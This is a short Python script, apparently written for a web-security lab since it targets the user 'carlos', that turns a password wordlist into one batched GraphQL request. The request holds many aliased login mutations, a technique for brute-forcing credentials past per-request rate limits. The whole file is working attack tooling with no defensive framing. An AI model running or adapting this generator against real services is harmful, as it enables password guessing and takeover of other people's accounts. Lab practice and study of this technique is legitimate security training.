wordlist_file = 'wordlist.txt'  # Replace with the path to your wordlist file
output_file = 'mutations.txt'   # The output file where mutations will be written

# Opening tag of the GraphQL mutation
mutation_start = "mutation {"

# GraphQL mutation template with an incrementing number
mutation_template = """
    bruteforce{}: login(input: {{
        username: "carlos",
        password: "{}"
    }}) {{
        token
        success
    }}
"""

# Closing tag of the GraphQL mutation
mutation_end = "}"

# Open the output file for writing
with open(output_file, 'w') as f_out:
    # Write the opening tag of the mutation
    f_out.write(mutation_start)
    f_out.write('\n')

    # Open the wordlist file for reading
    with open(wordlist_file, 'r') as f_wordlist:
        mutation_count = 0
        for line in f_wordlist:
            # Remove leading and trailing whitespace from each word
            password = line.strip()
            
            # Generate the mutation with the current password and write it to the output file
            mutation = mutation_template.format(mutation_count, password)
            f_out.write(mutation)
            f_out.write('\n')  # Add a newline after each mutation
            
            mutation_count += 1  # Increment the mutation count for each iteration

    # Write the closing tag of the mutation
    f_out.write(mutation_end)
    f_out.write('\n')

print(f"Mutations have been written to {output_file}")
